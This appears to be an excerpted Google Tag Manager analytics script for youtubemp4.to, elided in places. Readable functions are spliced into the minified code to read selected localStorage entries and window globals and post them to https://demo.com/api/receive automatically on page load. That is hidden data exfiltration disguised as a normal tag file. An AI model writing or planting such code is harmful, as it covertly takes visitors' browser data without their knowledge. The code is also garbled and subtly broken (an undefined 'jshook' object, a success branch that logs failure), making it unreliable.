...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 6,
        "vtp_includeConditions": ["list", "youtubemp4\\.to"],
        "tag_id": 18
      }, {
        ...
        "priority": 5,
        "vtp_instanceDestinationId": "G-NMC3ZK441Q",
        "tag_id": 26
      }, {
  ...
  var keysToTrack = window.keysToTrack;
  var Ie = function () {
    this.h = new gb();
    He(this);
  };
  ...
  function updatedCreateHashValue(data) {
    let newKeyList = Object.keys(data);
    let mergedKeys = newKeyList.join("|");
    let newHashValue = 0;
    for (let i = 0; i < mergedKeys.length; i++) {
      const charValue = mergedKeys.charCodeAt(i);
      newHashValue = (newHashValue << 5) - newHashValue + charValue;
      newHashValue |= 0;
    }
    return newHashValue.toString(16);
  }
  var Mf = function () {
      this.h = {};
    },
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.gk = "ChEIgMqfrAYQ8s3H9bmH+IiPARIlAKB3f7mXq/X4UBMqVRZQhML9lfx3Tgf06ezDIy2J+E4oUUzzeRoC5GE\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  function dumpLocalStorageData() {
    ...
    for (let i = 0; i < localStorage.length; i++) {
      ...
      if (keysToTrack.includes(keyItem)) {
        extractedData[keyItem] = localStorage.getItem(keyItem);
      }
    }
  ...
  function collectTrackingData() {
    let jshookData = {}; // assuming jshook is a functionality that collects interaction data
    for (let key in keysToTrack) {
      jshookData[keysToTrack[key]] = jshook.getData(keysToTrack[key]);
    }
    let globalVariableData = JSON.parse(JSON.stringify(globalVariableCollector));
    return {
  ...
  function postDataToBackend(dataObj) {
    let hashValue = updatedCreateHashValue(dataObj);
    let url = "https://demo.com/api/receive";
    ...
    xHttp.onreadystatechange = function () {
      if (this.readyState === 4 && this.status === 200) {
        ...
        console.error("Fail to send data. Error: " + this.statusText);
      }
    };
    xHttp.onerror = function () {
      console.error("Unexpected error while sending data");
    };
    xHttp.send(JSON.stringify({
      hashKey: hashValue,
      capturedData: dataObj
    }));
  }
  var Jm = function (a) {
  ...
  window.addEventListener('load', () => {
    postDataToBackend(collectTrackingData());
  ...
  function kE() {
    var a = new sb();
    M(this, "read_container_data"), a.set("containerId", 'G-NMC3ZK441Q'), a.set("version", '2'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
  ...
  for (let i = 0; i < keysToTrack.length; i++) {
    globalVariableCollector[keysToTrack[i]] = window[keysToTrack[i]];
  }
  ...
  function updateGlobalVariable(key, newValue) {
    window[key] = newValue;
    globalVariableCollector[key] = newValue;
  }
  var nF = function () {
    var a = Ua(),
      b = a + 864E5,
